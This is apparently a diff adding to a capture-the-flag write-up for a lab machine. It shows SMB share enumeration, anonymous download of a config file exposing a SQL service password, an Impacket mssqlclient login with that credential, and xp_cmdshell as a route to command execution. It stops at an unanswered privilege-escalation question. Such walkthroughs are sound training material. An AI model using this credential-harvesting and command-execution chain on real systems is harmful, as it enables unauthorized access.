@@ -2,6 +2,7 @@
 > Remote: 10.129.58.39
 
 > Local:  10.10.15.104
+---
 
 ## Nmap
 ```
@@ -97,3 +98,103 @@ Host script results:
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 22.28 seconds
 ```
+
+```# nmap -p445 --script smb-enum-shares 10.129.58.39
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-12 13:59 EDT
+Nmap scan report for 10.129.58.39
+Host is up (0.059s latency).
+
+PORT    STATE SERVICE
+445/tcp open  microsoft-ds
+
+Host script results:
+| smb-enum-shares: 
+|   account_used: guest
+|   \\10.129.58.39\ADMIN$: 
+|     Type: STYPE_DISKTREE_HIDDEN
+|     Comment: Remote Admin
+|     Anonymous access: <none>
+|     Current user access: <none>
+|   \\10.129.58.39\C$: 
+|     Type: STYPE_DISKTREE_HIDDEN
+|     Comment: Default share
+|     Anonymous access: <none>
+|     Current user access: <none>
+|   \\10.129.58.39\IPC$: 
+|     Type: STYPE_IPC_HIDDEN
+|     Comment: Remote IPC
+|     Anonymous access: READ/WRITE
+|     Current user access: READ/WRITE
+|   \\10.129.58.39\backups: 
+|     Type: STYPE_DISKTREE
+|     Comment: 
+|     Anonymous access: READ
+|_    Current user access: READ
+
+Nmap done: 1 IP address (1 host up) scanned in 39.07 seconds
+```
+
+---
+
+## smbclient login
+
+```
+# smbclient //10.129.58.39/backups -N
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Mon Jan 20 07:20:57 2020
+  ..                                  D        0  Mon Jan 20 07:20:57 2020
+  prod.dtsConfig                     AR      609  Mon Jan 20 07:23:02 2020
+
+                5056511 blocks of size 4096. 2560203 blocks available
+smb: \> get prod.dtsConfig 
+getting file \prod.dtsConfig of size 609 as prod.dtsConfig (0.9 KiloBytes/sec) (average 0.9 KiloBytes/sec)
+smb: \> exit
+```
+
+`cat` the file to see the contents: 
+```
+# cat prod.dtsConfig 
+<DTSConfiguration>
+    <DTSConfigurationHeading>
+        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
+    </DTSConfigurationHeading>
+    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
+        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
+    </Configuration>
+</DTSConfiguration> 
+```
+Contents: 
+- Password=M3g4c0rp123
+- User ID=ARCHETYPE\sql_svc
+- Initial Catalog=Catalog
+- Provider=SQLNCLI10.1
+- Persist Security Info=True
+- Auto Translate=False
+
+---
+
+## IMPacket: mssqlclient.py
+```
+# python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py -windows-auth ARCHETYPE/sql_svc:M3g4c0rp123@10.129.58.39
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(ARCHETYPE): Line 1: Changed database context to 'master'.
+[*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
+[!] Press help for extra shell commands
+SQL (ARCHETYPE\sql_svc  dbo@master)> 
+```
+
+Typing `help` gets you a menu... 
+
+What extended stored procedure of Microsoft SQL Server can be used in order to spawn a Windows command shell? 
+- Answer: `xp_cmdshell` (executes cmd using xp_cmdshell)
+- Example: `xp_cmdshell dir` runs `dir` as if from the cmd command line
+
+What script can be used in order to search possible paths to escalate privileges on Windows hosts?
+- Answer: 
